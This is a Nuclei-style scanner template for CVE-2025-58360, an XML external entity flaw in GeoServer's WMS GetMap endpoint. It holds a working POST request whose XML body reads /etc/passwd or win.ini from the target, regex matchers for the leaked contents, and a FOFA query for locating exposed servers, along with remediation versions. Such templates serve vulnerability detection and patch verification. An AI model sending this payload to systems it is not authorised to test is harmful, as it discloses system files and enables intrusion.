id: CVE-2025-58360

info:
  name: GeoServer - XML External Entity Injection
  author: lbb,xbow
  severity: high
  description: |
    GeoServer 2.26.0 to 2.26.2 and 2.25.6 contains an XML External Entity (XXE) injection caused by insufficient sanitization of XML input in /geoserver/wms GetMap operation, letting attackers disclose files or cause DoS, exploit requires crafted XML input.
  reference:
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525
  impact: |
    Attackers can disclose sensitive files or cause denial of service by exploiting XML external entity processing.
  remediation: |
    Update to GeoServer 2.25.6, 2.26.3, 2.27.0 or later.
  metadata:
    verified: true
    max-request: 3
    fofa-query: app="GeoServer
  tags: cve,cve2025,geoserver,xxe,wms

http:
  - raw:
      - |
        POST /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/vnd.ogc.sld+xml

        <?xml version="1.0"?>
        <!DOCTYPE root [
          <!ENTITY xxe SYSTEM "{{files}}">
        ]>
        <StyledLayerDescriptor xmlns="http://www.opengis.net/sld">
          <NamedLayer>
            <Name>&xxe;</Name>
            <UserStyle/>
          </NamedLayer>
        </StyledLayerDescriptor>

    payloads:
      files:
        - "/etc/passwd"
        - "C:/Windows/win.ini"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "for 16-bit app support"
        condition: or

      - type: status
        status:
          - 200
